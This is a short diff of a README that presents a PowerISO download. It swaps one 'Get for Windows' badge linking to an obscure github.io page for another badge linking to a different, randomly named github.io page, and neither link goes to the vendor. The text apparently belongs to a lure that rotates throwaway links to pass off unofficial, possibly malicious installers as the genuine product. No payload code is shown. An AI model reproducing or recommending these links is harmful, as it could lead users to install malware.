@@ -4,10 +4,8 @@
   <img src="https://garvis.ca/wp-content/uploads/2018/10/poweriso_thumb.jpg?w=1028&h=290" alt="PowerISO Logo"/>
 </div>
 
-<div align="center">
+[![GET PowerISO Software](https://img.shields.io/badge/GET%20%E2%80%94%20PowerISO-Software-0078D6?style=for-the-badge&logoColor=white)](https://ravencherryviolingk1588181.github.io/.github/PowerISO-Software)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://kraignery.github.io/.github/PowerISO-Software)
-</div>
 
 ---
 
